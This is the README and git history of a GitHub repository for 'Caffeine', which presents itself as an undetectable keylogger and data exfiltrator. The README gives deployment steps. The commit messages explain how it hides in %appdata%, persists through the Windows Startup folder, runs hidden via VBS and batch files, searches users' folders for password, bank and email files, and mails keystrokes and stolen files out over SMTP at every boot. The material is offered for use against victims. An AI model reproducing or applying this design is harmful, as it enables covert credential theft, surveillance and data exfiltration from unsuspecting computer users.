@@ -1,0 +1,142 @@
+======================: FILES :======================
+======================: README CONTENT :======================
+# caffeine
+
+<h1>Caffeine (A FUD Key logger and Data Exflirtator)</h1>
+
+Caffeine is a computer malware, more specifically a fully undetectable key logger. The malware copies itself in a hidden windows directory and logs all the key presses. It stores them in a text file adding the timestamp of each key press, in addition to a confidential file of your choice and mails it to a specific email address each time the computer starts .
+
+The malware can get but it’s not limited to: getting the credentials of a victim, bank passwords, emails, files, usage patterns and confidential information. Caffeine offers the possibility of further extension up to a certain point that does not raise any red flags in the system thus triggering the Antivirus. 
+
+<h2>How to use:</h2>
+<ul>
+    <li>
+        <h4>Edit <a href="https://github.com/firec0de/caffeine/blob/main/caffeineMeter.pyw" rel="noopener noreferrer" target="_blank">caffeinemeter.pyw </a>with an email and password</h4>
+    </li>
+    <li>
+        <h4>Enable <a href="https://myaccount.google.com/lesssecureapps" rel="noopener noreferrer" target="_blank">less secure</a> apps to access Gmail</h4>
+    </li>
+    <li>
+        <h4>Convert pyw files to exe using <a href="https://pypi.org/project/auto-py-to-exe/" rel="noopener noreferrer" target="_blank">Auto-Py-to-Exe</a></h4>
+    </li>
+    <li>
+        <h4>Run <a href="https://github.com/firec0de/caffeine/blob/main/first.bat" rel="noopener noreferrer" target="_blank">first.bat</a></h4>
+    </li>
+</ul>
+====================== GIT HISTORY: ======================
+764ed42 HEAD@{0}: clone: from https://github.com/firec0de/caffeine
+commit 764ed42736fef591d9afe9b167d5847e41fe26fa
+Author: Ernando <67567107+firec0de@users.noreply.github.com>
+Date:   Fri Dec 10 15:38:00 2021 +0100
+
+    Update caffeineMeter.pyw
+
+commit 59e1a816036b98a6b00a60cd4363369305c88d1a
+Author: firec0de <67567107+firec0de@users.noreply.github.com>
+Date:   Sat Dec 5 23:25:28 2020 +0100
+
+    Update README.md
+
+commit 35f81efc4bd5c3464401ab4b04238ab2a9465a99
+Author: firec0de <67567107+firec0de@users.noreply.github.com>
+Date:   Sat Dec 5 23:20:36 2020 +0100
+
+    Update README.md
+
+commit 61ed5190ca84a35572caa8a2f0f3f4858504588b
+Author: firec0de <67567107+firec0de@users.noreply.github.com>
+Date:   Sat Dec 5 23:20:13 2020 +0100
+
+    Update README.md
+
+commit 1f5832414825eece23231c2691a72857aa2a3124
+Author: firec0de <67567107+firec0de@users.noreply.github.com>
+Date:   Sat Dec 5 23:18:31 2020 +0100
+
+    Update README.md
+
+commit d82d3e68a45076ccda558b5dcaebcf1b9d3cb378
+Author: firec0de <67567107+firec0de@users.noreply.github.com>
+Date:   Sat Dec 5 23:13:19 2020 +0100
+
+    Update starter.vbs
+    
+    This file is used for running from the %appdata% directory the files caffeine.exe and caffeineMeter.exe hidden without displaying anything on the screen.
+
+commit e44fb937aa0a1b5e26cb1a63313b3e4eeab35561
+Author: firec0de <67567107+firec0de@users.noreply.github.com>
+Date:   Sat Dec 5 23:11:55 2020 +0100
+
+    one.vbs
+    
+    This file is used for running the file first.bat hidden, without displaying anything
+
+commit e46c93fa3663c8fd8ed9a11793a92499b23f5d02
+Author: firec0de <67567107+firec0de@users.noreply.github.com>
+Date:   Sat Dec 5 23:11:08 2020 +0100
+
+    first.bat
+    
+    This file is used for copying the files caffeine.exe, caffeineMeter.exe, starter.vbs to the directory %appdata% and creating a shortcut of the file starter.vbs in the Windows startup folder.
+
+commit def3804c60d242138514df30a13f6cd473bcdd34
+Author: firec0de <67567107+firec0de@users.noreply.github.com>
+Date:   Sat Dec 5 23:07:33 2020 +0100
+
+    Add files via upload
+
+commit d5566346ed9d59162a03d908e62ca585eb33a88a
+Author: firec0de <67567107+firec0de@users.noreply.github.com>
+Date:   Sat Dec 5 22:04:34 2020 +0100
+
+    Update README.md
+
+commit a8abeaf16aabae7948685f9ea95a98988a5bd8c8
+Author: firec0de <67567107+firec0de@users.noreply.github.com>
+Date:   Wed Nov 4 17:16:01 2020 +0100
+
+    caffeineMeter.pyw
+    
+    This other part of the malware is a bit more complicated because it involves multiple libraries such as smtplib, socket, encoders, os and parts of the MIME library (MIME multipart, MIME base and MIME text). The first function is called milk I choose this name because it reassembles the milking process of a cow when extracting a file from the directory. I added this data exfiltration feature lately, before this class was only used to send the coffee.txt logs that caffeine produces.
+    The method takes the parameter folder which I have set to C:\\Usersbecause in this directory it can find every file that all the users of that machine have. The methods scans every folder starting from my documents, downloads, desktop, my photos, and every subfolder that exists for all of the users. This scan is what takes a little bit of time but comparing to the damage it does is worth it. The method uses the library OS which provides portable ways of using system dependent functionalities. [14]
+    First I created an empty string named file_list, and a loop that opens the directory we have set before as variable name folder and for every path, directory and file that exists in that directory it uses string matching to find files ending with the extension .txt, .pdf, .doc and .docx.These files types are usually where sensitive information I am looking for is found: text files pdf files or word documents. After finding these types of files it chooses only the files that start with the name passw(haven’t used password because some applications use shorted names like psw or passw), bank, statement or email. After the finding a file that matches all the conditions it gets the directory and the filename and saves them as a string to the variable I created before file_list.
+    This method returns file_listso when calling it we get that variable for example “C://Users/Admin/Desktop/bank_statement_uba2020.pdf”
+    This method can be improved further by adding the option to search for more file types/extensions and adding a faster searching algorithm.
+    The second method called getPcNameuses the library socket which provides access to the BSD socket interface. I have used the libraries method getHostname() and getHostByName()which in combination together return the IPV4 address and the hostname of the machine where it is currently running as a string. The method returns the string useridwhich concatenates the IP and
+    23
+    the name in one. This is later used as a subject for the email address to differentiate where the logs are coming from for example Loggs from Ernando-PC @ 112.158.126.31. [15]
+    I have created some variables that contain the information needed for the third and last method of the malware which are email_username, email_password, email_receiver, subject, body, filename and filename2. The sendMail method takes these variables as a parameter it uses the MIME library from the emailmodule. Firstly it creates a multipart object named msg which takes the parameters: from, to, subject and attachment which I have set equal to the variables above. To the msg object attached is MIMEtext object which defines the content and the content type in this case is the variable body and the type plainas in plain text, the method open() that is used to read a file in text format by default setting the mode parameter to rb meaning opening a file in binary format for reading.[16] [17] [18]
+    Second is created the MIMEbase object reading the attachment and encoding it into base64 in order to be sent, the object I called part part is then attached to the msg object, then a variable called text converts the whole msg with the partattached to string.
+    The connection to the SMTP server is done by firstly naming a variable server that calls the smtp library setting the servers SMTPaddress and port then startinga TSL connection to the server. After logging in with the SMTP server using the login credentials of my email account which in this case I set to the variables email_username and email_password, I use the method sendmail of the smtp library to send the mail with the other remaining parameters. These being email_username, email_receiver and the text variable which holds the whole message as a string created before, after this I call the default quit() method to close the connection.[17][18]
+    In the end of the file I call the method sendMail() in order to execute it with the parameters set above twice; once with the variable filename and second with the variable filename2 where the first has attached coffee.txt from caffeine.exe and the second sends the same except attached is the file that is returned from the method milk(), the sensitive data.
+    In the end we get two emails in the inbox giving us the victim’s key logs of the whole day everyday and their sensitive data updated because the scan runs every time the computer starts.
+
+commit 42eedceb510efe252b3ae20137188fb44c50ccfb
+Author: firec0de <67567107+firec0de@users.noreply.github.com>
+Date:   Wed Nov 4 17:06:15 2020 +0100
+
+    Create caffeine.pyw
+    
+    Caffeine is started from one.vbs which is used to run the first.bat script hidden with no pop-ups or command line.
+    WshShell is a generic name for a powerful object that enables you to query and interact with various aspects of the Windows shell. It can display information to the user, run applications, create shortcuts, work with the Registry, and control Windows' environment variables.[11]
+    Here one.vbs refers to the shell object and executes first.bat while telling the shell to display nothing while executing the batch file.(See Appendix A for detailed information)
+    Getting in the system, first.bat is a set of simple commands that copy caffeine.exe, caffeineMeter.exe and starter.vbs into the windows directory:
+    “C:\Users\USER-HERE\AppData\Roaming” this is a deep directory in windows that contains application data and settings that are specific to the apps in your windows pc. This directory is not browsed by normal users 90% of the time and is safe to say hiding the malware here is a good measure.
+    It was tricky accomplishing this copy command because the directory has a different name in every machine because of the computer name \User-Here\ can be possibly everything. I solved this problem by researching, I found that windows uses variable names for specific directories such as %WORD%, %temp% and one of them was also %appdata%, these variable names point to the folder’s directory. So calling %appdata% in different machines points to the application data directory of that machine.
+    After copying the files into the directory an internet shortcut is created in the startup folder of windows. This folder is Windows default and everything inside it runs every time the computer starts. This startup folder lives inside some folders where %appdata% points to, this is the startup folder directory:
+    “C:\Users\USER-HERE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup”.
+    As we can see our variable name points up to the Roaming folder where deep inside it resides the startup folder so I added %Appdata% and as usual the other part “\Microsoft\Windows\Start Menu\Programs\Startup\”. In addition to the directory, the shortcut also needs a name which I simply called it autostart. The internet shortcut needs four parameters to be created the directory
+    20
+    where it will reside, the name, the application where does it point to and the icon.
+
+commit 401cda9f34cdeeffb34f6dcf8f4c5dc8b5d7df42
+Author: firec0de <67567107+firec0de@users.noreply.github.com>
+Date:   Wed Nov 4 17:03:03 2020 +0100
+
+    Update README.md
+
+commit 029f4406f38f229609dae80a1f18397aa8b7fa97
+Author: firec0de <67567107+firec0de@users.noreply.github.com>
+Date:   Wed Nov 4 16:59:59 2020 +0100
+
+    Initial commit
